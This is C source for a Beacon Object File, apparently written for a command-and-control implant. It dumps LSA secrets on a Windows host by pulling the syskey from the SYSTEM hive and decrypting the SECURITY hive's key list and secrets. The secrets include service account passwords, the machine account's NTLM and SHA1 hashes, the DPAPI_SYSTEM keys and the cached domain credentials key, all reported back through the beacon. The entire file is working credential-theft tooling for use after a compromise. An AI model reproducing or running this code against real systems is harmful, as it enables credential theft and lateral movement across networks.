/*
 * lsadump_secrets BOF by shashinma
 * Dumps LSA secrets from the SECURITY registry hive
 * Requires SYSTEM privileges
 */

#include "include/secrets.h"
#include "lsadump_helper.c"

// ============================================================================
// Hash Computation Functions
// ============================================================================

static BOOL ComputeMD4(HCRYPTPROV hProv, const BYTE* data, DWORD dataLen, BYTE hash[16]) {
    HCRYPTHASH hHash = 0;
    DWORD hashLen = 16;
    BOOL result = FALSE;

    if (!ADVAPI32$CryptCreateHash(hProv, CALG_MD4, 0, 0, &hHash))
        return FALSE;

    if (ADVAPI32$CryptHashData(hHash, data, dataLen, 0))
        result = ADVAPI32$CryptGetHashParam(hHash, HP_HASHVAL, hash, &hashLen, 0);

    ADVAPI32$CryptDestroyHash(hHash);
    return result;
}

static BOOL ComputeSHA1(HCRYPTPROV hProv, const BYTE* data, DWORD dataLen, BYTE hash[20]) {
    HCRYPTHASH hHash = 0;
    DWORD hashLen = 20;
    BOOL result = FALSE;

    if (!ADVAPI32$CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash))
        return FALSE;

    if (ADVAPI32$CryptHashData(hHash, data, dataLen, 0))
        result = ADVAPI32$CryptGetHashParam(hHash, HP_HASHVAL, hash, &hashLen, 0);

    ADVAPI32$CryptDestroyHash(hHash);
    return result;
}

// ============================================================================
// Domain Information
// ============================================================================

static void GetDomainInfo(HKEY hSecurity) {
    HKEY hPolicy, hKey;
    DWORD size, type;
    BYTE* buffer = NULL;
    
    if (ADVAPI32$RegOpenKeyExW(hSecurity, L"Policy", 0, KEY_READ, &hPolicy) != ERROR_SUCCESS)
        return;

    if (ADVAPI32$RegOpenKeyExW(hPolicy, L"PolAcDmN", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        size = 0;
        ADVAPI32$RegQueryValueExW(hKey, NULL, NULL, &type, NULL, &size);
        if (size > 0) {
            buffer = (BYTE*)AllocMem(size);
            if (buffer && ADVAPI32$RegQueryValueExW(hKey, NULL, NULL, NULL, buffer, &size) == ERROR_SUCCESS) {
                if (size >= 8) {
                    DWORD strLen = *(DWORD*)buffer;
                    wchar_t* domainName = (wchar_t*)(buffer + 8);
                    if (strLen > 0) {
                        BeaconPrintf(CALLBACK_OUTPUT, "Domain     : %S\n", domainName);
                    }
                }
            }
            FreeMem(buffer);
        }
        ADVAPI32$RegCloseKey(hKey);
    }

    if (ADVAPI32$RegOpenKeyExW(hPolicy, L"PolPrDmN", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        size = 0;
        ADVAPI32$RegQueryValueExW(hKey, NULL, NULL, &type, NULL, &size);
        if (size > 0) {
            buffer = (BYTE*)AllocMem(size);
            if (buffer && ADVAPI32$RegQueryValueExW(hKey, NULL, NULL, NULL, buffer, &size) == ERROR_SUCCESS) {
                if (size >= 8) {
                    DWORD strLen = *(DWORD*)buffer;
                    wchar_t* domainName = (wchar_t*)(buffer + 8);
                    if (strLen > 0) {
                        BeaconPrintf(CALLBACK_OUTPUT, "Domain name: %S\n", domainName);
                    }
                }
            }
            FreeMem(buffer);
        }
        ADVAPI32$RegCloseKey(hKey);
    }

    if (ADVAPI32$RegOpenKeyExW(hPolicy, L"PolDnDDN", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        size = 0;
        ADVAPI32$RegQueryValueExW(hKey, NULL, NULL, &type, NULL, &size);
        if (size > 0) {
            buffer = (BYTE*)AllocMem(size);
            if (buffer && ADVAPI32$RegQueryValueExW(hKey, NULL, NULL, NULL, buffer, &size) == ERROR_SUCCESS) {
                if (size >= 8) {
                    DWORD strLen = *(DWORD*)buffer;
                    wchar_t* dnsName = (wchar_t*)(buffer + 8);
                    if (strLen > 0) {
                        BeaconPrintf(CALLBACK_OUTPUT, "Domain FQDN: %S\n", dnsName);
                    }
                }
            }
            FreeMem(buffer);
        }
        ADVAPI32$RegCloseKey(hKey);
    }

    if (ADVAPI32$RegOpenKeyExW(hPolicy, L"PolRevision", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD revision[2] = {0, 0};
        size = sizeof(revision);
        if (ADVAPI32$RegQueryValueExW(hKey, NULL, NULL, NULL, (BYTE*)revision, &size) == ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT, "\nPolicy subsystem is : %d.%d\n", revision[0] >> 16, revision[0] & 0xFFFF);
        }
        ADVAPI32$RegCloseKey(hKey);
    }

    ADVAPI32$RegCloseKey(hPolicy);
}

// ============================================================================
// AES-256 Derive and Decrypt
// ============================================================================

static BOOL DeriveAndDecrypt(HCRYPTPROV hProv, const BYTE* key, DWORD keySize, 
                              const BYTE* lazyiv, BYTE* data, DWORD* dataSize) {
    HCRYPTHASH hHash = 0;
    HCRYPTKEY hKey = 0;
    BYTE derivedKey[32];
    DWORD hashLen = 32;
    DWORD i;
    AES_KEY_BLOB keyBlob;
    DWORD mode = CRYPT_MODE_ECB;
    BOOL result = FALSE;

    if (!ADVAPI32$CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))
        return FALSE;

    ADVAPI32$CryptHashData(hHash, (BYTE*)key, keySize, 0);
    for (i = 0; i < 1000; i++)
        ADVAPI32$CryptHashData(hHash, (BYTE*)lazyiv, LAZY_NT6_IV_SIZE, 0);

    ADVAPI32$CryptGetHashParam(hHash, HP_HASHVAL, derivedKey, &hashLen, 0);
    ADVAPI32$CryptDestroyHash(hHash);

    keyBlob.header.bType = PLAINTEXTKEYBLOB;
    keyBlob.header.bVersion = CUR_BLOB_VERSION;
    keyBlob.header.reserved = 0;
    keyBlob.header.aiKeyAlg = CALG_AES_256;
    keyBlob.keySize = 32;
    MSVCRT$memcpy(keyBlob.key, derivedKey, 32);

    if (!ADVAPI32$CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey))
        return FALSE;

    ADVAPI32$CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0);
    result = ADVAPI32$CryptDecrypt(hKey, 0, FALSE, 0, data, dataSize);
    ADVAPI32$CryptDestroyKey(hKey);
    
    return result;
}

// ============================================================================
// Get LSA Keys
// ============================================================================

static BOOL GetLsaKeys(HKEY hSecurity, const BYTE sysKey[SYSKEY_LENGTH], HCRYPTPROV hProv, LSA_KEYS_INFO* pInfo) {
    HKEY hPolicy, hPolKey;
    LONG res;
    DWORD size, type;
    PBYTE buffer = NULL;
    DWORD encryptedSize, secretSize;
    DWORD i, offset;

    MSVCRT$memset(pInfo, 0, sizeof(LSA_KEYS_INFO));

    res = ADVAPI32$RegOpenKeyExW(hSecurity, L"Policy", 0, KEY_READ, &hPolicy);
    if (res != ERROR_SUCCESS) return FALSE;

    res = ADVAPI32$RegOpenKeyExW(hPolicy, L"PolEKList", 0, KEY_READ, &hPolKey);
    if (res != ERROR_SUCCESS) {
        ADVAPI32$RegCloseKey(hPolicy);
        return FALSE;
    }

    size = 0;
    ADVAPI32$RegQueryValueExW(hPolKey, NULL, NULL, &type, NULL, &size);
    if (size == 0) {
        ADVAPI32$RegCloseKey(hPolKey);
        ADVAPI32$RegCloseKey(hPolicy);
        return FALSE;
    }

    buffer = (PBYTE)AllocMem(size);
    if (!buffer) {
        ADVAPI32$RegCloseKey(hPolKey);
        ADVAPI32$RegCloseKey(hPolicy);
        return FALSE;
    }

    ADVAPI32$RegQueryValueExW(hPolKey, NULL, NULL, NULL, buffer, &size);
    ADVAPI32$RegCloseKey(hPolKey);
    ADVAPI32$RegCloseKey(hPolicy);

    encryptedSize = size - OFF_ENCRYPTED;
    if (!DeriveAndDecrypt(hProv, sysKey, SYSKEY_LENGTH, buffer + OFF_LAZYIV, buffer + OFF_ENCRYPTED, &encryptedSize)) {
        FreeMem(buffer);
        return FALSE;
    }

    secretSize = *(DWORD*)(buffer + OFF_ENCRYPTED + OFF_SECRET_SIZE);
    if (secretSize == 0 || secretSize > 4096) {
        FreeMem(buffer);
        return FALSE;
    }

    pInfo->keys = (PBYTE)AllocMem(secretSize);
    if (!pInfo->keys) {
        FreeMem(buffer);
        return FALSE;
    }
    MSVCRT$memcpy(pInfo->keys, buffer + OFF_ENCRYPTED + OFF_SECRET_DATA, secretSize);
    pInfo->nbKeys = *(DWORD*)(pInfo->keys + OFF_KEYS_NBKEYS);

    MSVCRT$memcpy(pInfo->currentKeyId, pInfo->keys + OFF_KEYS_CURRENTKEYID, 16);

    offset = 0;
    for (i = 0; i < pInfo->nbKeys; i++) {
        PBYTE keyPtr = pInfo->keys + OFF_KEYS_KEYS + offset;
        DWORD keySize = *(DWORD*)(keyPtr + OFF_KEY_KEYSIZE);
        
        if (MSVCRT$memcmp(pInfo->currentKeyId, keyPtr + OFF_KEY_KEYID, 16) == 0) {
            pInfo->currentKeySize = keySize;
            if (keySize <= 64) {
                MSVCRT$memcpy(pInfo->currentKey, keyPtr + OFF_KEY_KEY, keySize);
            }
            break;
        }
        offset += OFF_KEY_KEY + keySize;
    }

    FreeMem(buffer);
    return TRUE;
}

// ============================================================================
// Find LSA Key by GUID
// ============================================================================

static BOOL FindLsaKey(LSA_KEYS_INFO* pInfo, const BYTE* keyId, PBYTE* pKey, PDWORD pKeySize) {
    DWORD i, offset = 0;
    PBYTE keyPtr;
    DWORD keySize;

    for (i = 0; i < pInfo->nbKeys; i++) {
        keyPtr = pInfo->keys + OFF_KEYS_KEYS + offset;
        keySize = *(DWORD*)(keyPtr + OFF_KEY_KEYSIZE);
        
        if (MSVCRT$memcmp(keyId, keyPtr + OFF_KEY_KEYID, 16) == 0) {
            *pKey = keyPtr + OFF_KEY_KEY;
            *pKeySize = keySize;
            return TRUE;
        }
        
        offset += OFF_KEY_KEY + keySize;
    }
    return FALSE;
}

// ============================================================================
// Decrypt Secret
// ============================================================================

static BOOL DecryptSecretValue(HKEY hSecrets, const wchar_t* secretName, const wchar_t* valueName,
                               LSA_KEYS_INFO* pInfo, HCRYPTPROV hProv, PBYTE* pData, PDWORD pSize) {
    HKEY hSecret, hVal;
    LONG res;
    DWORD size, type, encryptedSize, secretSize;
    PBYTE buffer = NULL;
    PBYTE key;
    DWORD keySize;

    res = ADVAPI32$RegOpenKeyExW(hSecrets, secretName, 0, KEY_READ, &hSecret);
    if (res != ERROR_SUCCESS) return FALSE;

    res = ADVAPI32$RegOpenKeyExW(hSecret, valueName, 0, KEY_READ, &hVal);
    ADVAPI32$RegCloseKey(hSecret);
    if (res != ERROR_SUCCESS) return FALSE;

    size = 0;
    ADVAPI32$RegQueryValueExW(hVal, NULL, NULL, &type, NULL, &size);
    if (size == 0 || size < OFF_ENCRYPTED) {
        ADVAPI32$RegCloseKey(hVal);
        return FALSE;
    }

    buffer = (PBYTE)AllocMem(size);
    if (!buffer) {
        ADVAPI32$RegCloseKey(hVal);
        return FALSE;
    }

    ADVAPI32$RegQueryValueExW(hVal, NULL, NULL, NULL, buffer, &size);
    ADVAPI32$RegCloseKey(hVal);

    if (!FindLsaKey(pInfo, buffer + OFF_KEYID, &key, &keySize)) {
        FreeMem(buffer);
        return FALSE;
    }

    encryptedSize = size - OFF_ENCRYPTED;
    if (!DeriveAndDecrypt(hProv, key, keySize, buffer + OFF_LAZYIV, buffer + OFF_ENCRYPTED, &encryptedSize)) {
        FreeMem(buffer);
        return FALSE;
    }

    secretSize = *(DWORD*)(buffer + OFF_ENCRYPTED + OFF_SECRET_SIZE);
    if (secretSize == 0 || secretSize > 65536) {
        FreeMem(buffer);
        return FALSE;
    }

    *pData = (PBYTE)AllocMem(secretSize);
    if (*pData) {
        MSVCRT$memcpy(*pData, buffer + OFF_ENCRYPTED + OFF_SECRET_DATA, secretSize);
        *pSize = secretSize;
    }

    FreeMem(buffer);
    return (*pData != NULL);
}

// ============================================================================
// Display Secret
// ============================================================================

static void DisplaySecretData(const wchar_t* prefix, const BYTE* data, DWORD size, HCRYPTPROV hProv, const wchar_t* name) {
    char prefixA[16];
    DWORD i;
    BOOL isPrintable = TRUE;

    for (i = 0; prefix[i] && i < 15; i++)
        prefixA[i] = (char)prefix[i];
    prefixA[i] = '\0';

    for (i = 0; i < size; i++) {
        if (data[i] != 0 && (data[i] < 0x20 || data[i] > 0x7e)) {
            isPrintable = FALSE;
            break;
        }
    }

    char hexBuf[512];
    if (isPrintable && size > 2) {
        BeaconPrintf(CALLBACK_OUTPUT, "%s/text: %.*S\n", prefixA, size / sizeof(wchar_t), data);
    } else {
        FormatHex(data, size > 64 ? 64 : size, hexBuf, sizeof(hexBuf));
        if (size > 64)
            BeaconPrintf(CALLBACK_OUTPUT, "%s/hex : %s...\n", prefixA, hexBuf);
        else
            BeaconPrintf(CALLBACK_OUTPUT, "%s/hex : %s\n", prefixA, hexBuf);
    }

    if (MSVCRT$_wcsicmp(name, L"$MACHINE.ACC") == 0 && size > 0) {
        BYTE ntlmHash[16];
        BYTE sha1Hash[20];
        
        if (ComputeMD4(hProv, data, size, ntlmHash)) {
            FormatHex(ntlmHash, 16, hexBuf, sizeof(hexBuf));
            BeaconPrintf(CALLBACK_OUTPUT, "    NTLM: %s\n", hexBuf);
        }
        
        if (ComputeSHA1(hProv, data, size, sha1Hash)) {
            FormatHex(sha1Hash, 20, hexBuf, sizeof(hexBuf));
            BeaconPrintf(CALLBACK_OUTPUT, "    SHA1: %s\n", hexBuf);
        }
    }

    if (MSVCRT$_wcsicmp(name, L"DPAPI_SYSTEM") == 0 && size == sizeof(DWORD) + 2 * SHA_DIGEST_LENGTH) {
        char hexBuf2[64], hexBuf3[64];
        FormatHex(data + sizeof(DWORD), 2 * SHA_DIGEST_LENGTH, hexBuf, sizeof(hexBuf));
        FormatHex(data + sizeof(DWORD), SHA_DIGEST_LENGTH, hexBuf2, sizeof(hexBuf2));
        FormatHex(data + sizeof(DWORD) + SHA_DIGEST_LENGTH, SHA_DIGEST_LENGTH, hexBuf3, sizeof(hexBuf3));
        BeaconPrintf(CALLBACK_OUTPUT, "    full: %s\n    m/u : %s / %s\n", hexBuf, hexBuf2, hexBuf3);
    }

    if (MSVCRT$_wcsicmp(name, L"NL$KM") == 0 && size == 64) {
        BeaconPrintf(CALLBACK_OUTPUT, "    (Cached domain credentials key)\n");
    }
}

// ============================================================================
// Enumerate Secrets
// ============================================================================

static void EnumerateSecrets(HKEY hSecurity, LSA_KEYS_INFO* pInfo, HCRYPTPROV hProv) {
    HKEY hSecrets;
    LONG res;
    DWORD numSubKeys = 0, maxKeyLen = 0;
    wchar_t* keyName = NULL;
    DWORD i, keyNameLen;
    PBYTE curData, oldData;
    DWORD curSize, oldSize;

    res = ADVAPI32$RegOpenKeyExW(hSecurity, L"Policy\\Secrets", 0, KEY_READ, &hSecrets);
    if (res != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open Secrets: %d\n", res);
        return;
    }

    ADVAPI32$RegQueryInfoKeyW(hSecrets, NULL, NULL, NULL, &numSubKeys, &maxKeyLen, NULL, NULL, NULL, NULL, NULL, NULL);

    maxKeyLen++;
    keyName = (wchar_t*)AllocMem((maxKeyLen + 1) * sizeof(wchar_t));
    if (!keyName) {
        ADVAPI32$RegCloseKey(hSecrets);
        return;
    }

    for (i = 0; i < numSubKeys; i++) {
        char nameA[128];
        DWORD j;

        keyNameLen = maxKeyLen;
        res = ADVAPI32$RegEnumKeyExW(hSecrets, i, keyName, &keyNameLen, NULL, NULL, NULL, NULL);
        if (res != ERROR_SUCCESS) continue;

        for (j = 0; j < 127 && keyName[j]; j++) nameA[j] = (char)keyName[j];
        nameA[j] = '\0';

        BeaconPrintf(CALLBACK_OUTPUT, "\nSecret  : %s", nameA);

        if (MSVCRT$_wcsnicmp(keyName, L"_SC_", 4) == 0) {
            wchar_t servicePath[256];
            HKEY hService;
            MSVCRT$swprintf_s(servicePath, 256, L"SYSTEM\\CurrentControlSet\\Services\\%s", keyName + 4);
            if (ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, servicePath, 0, KEY_READ, &hService) == ERROR_SUCCESS) {
                wchar_t objectName[128];
                DWORD objNameSize = sizeof(objectName);
                if (ADVAPI32$RegQueryValueExW(hService, L"ObjectName", NULL, NULL, (BYTE*)objectName, &objNameSize) == ERROR_SUCCESS) {
                    BeaconPrintf(CALLBACK_OUTPUT, " / service '%s' with username : %S", nameA + 4, objectName);
                }
                ADVAPI32$RegCloseKey(hService);
            }
        }
        BeaconPrintf(CALLBACK_OUTPUT, "\n");

        curData = NULL; curSize = 0;
        oldData = NULL; oldSize = 0;

        if (DecryptSecretValue(hSecrets, keyName, L"CurrVal", pInfo, hProv, &curData, &curSize)) {
            DisplaySecretData(L"cur", curData, curSize, hProv, keyName);
            FreeMem(curData);
        }

        if (DecryptSecretValue(hSecrets, keyName, L"OldVal", pInfo, hProv, &oldData, &oldSize)) {
            DisplaySecretData(L"old", oldData, oldSize, hProv, keyName);
            FreeMem(oldData);
        }
    }

    FreeMem(keyName);
    ADVAPI32$RegCloseKey(hSecrets);
}

// ============================================================================
// Entry Point
// ============================================================================

void go(char* args, int len) {
    (void)args; (void)len;
    
    HKEY hSystem = NULL, hSecurity = NULL;
    BYTE sysKey[SYSKEY_LENGTH];
    LONG res;
    HCRYPTPROV hProv = 0;
    LSA_KEYS_INFO lsaInfo;
    char computerName[256];
    DWORD computerNameLen = 256;
    char hexStr[128];

    BeaconPrintf(CALLBACK_OUTPUT, "\n");

    res = ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM", 0, KEY_READ, &hSystem);
    if (res != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open SYSTEM: %d\n", res);
        return;
    }

    if (!GetSyskey(hSystem, sysKey)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to extract syskey\n");
        ADVAPI32$RegCloseKey(hSystem);
        return;
    }

    KERNEL32$GetComputerNameA(computerName, &computerNameLen);
    BeaconPrintf(CALLBACK_OUTPUT, "Local name : %s\n", computerName);
    FormatHex(sysKey, SYSKEY_LENGTH, hexStr, sizeof(hexStr));
    BeaconPrintf(CALLBACK_OUTPUT, "SysKey : %s\n", hexStr);
    ADVAPI32$RegCloseKey(hSystem);

    res = ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SECURITY", 0, KEY_READ, &hSecurity);
    if (res != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open SECURITY: %d (requires SYSTEM privileges)\n", res);
        return;
    }

    GetDomainInfo(hSecurity);

    if (!ADVAPI32$CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CryptAcquireContext failed\n");
        goto cleanup;
    }

    if (!GetLsaKeys(hSecurity, sysKey, hProv, &lsaInfo)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to extract LSA keys\n");
        ADVAPI32$CryptReleaseContext(hProv, 0);
        goto cleanup;
    }

    FormatHex(lsaInfo.currentKey, lsaInfo.currentKeySize, hexStr, sizeof(hexStr));
    BeaconPrintf(CALLBACK_OUTPUT, "LSA Key(s) : %u, default {%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x}\n",
        lsaInfo.nbKeys,
        lsaInfo.currentKeyId[3], lsaInfo.currentKeyId[2], lsaInfo.currentKeyId[1], lsaInfo.currentKeyId[0],
        lsaInfo.currentKeyId[5], lsaInfo.currentKeyId[4],
        lsaInfo.currentKeyId[7], lsaInfo.currentKeyId[6],
        lsaInfo.currentKeyId[8], lsaInfo.currentKeyId[9],
        lsaInfo.currentKeyId[10], lsaInfo.currentKeyId[11], lsaInfo.currentKeyId[12], lsaInfo.currentKeyId[13], lsaInfo.currentKeyId[14], lsaInfo.currentKeyId[15]);
    BeaconPrintf(CALLBACK_OUTPUT, "  [00] {%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x} %s\n",
        lsaInfo.currentKeyId[3], lsaInfo.currentKeyId[2], lsaInfo.currentKeyId[1], lsaInfo.currentKeyId[0],
        lsaInfo.currentKeyId[5], lsaInfo.currentKeyId[4],
        lsaInfo.currentKeyId[7], lsaInfo.currentKeyId[6],
        lsaInfo.currentKeyId[8], lsaInfo.currentKeyId[9],
        lsaInfo.currentKeyId[10], lsaInfo.currentKeyId[11], lsaInfo.currentKeyId[12], lsaInfo.currentKeyId[13], lsaInfo.currentKeyId[14], lsaInfo.currentKeyId[15],
        hexStr);

    EnumerateSecrets(hSecurity, &lsaInfo, hProv);

    FreeMem(lsaInfo.keys);
    ADVAPI32$CryptReleaseContext(hProv, 0);

cleanup:
    ADVAPI32$RegCloseKey(hSecurity);
}
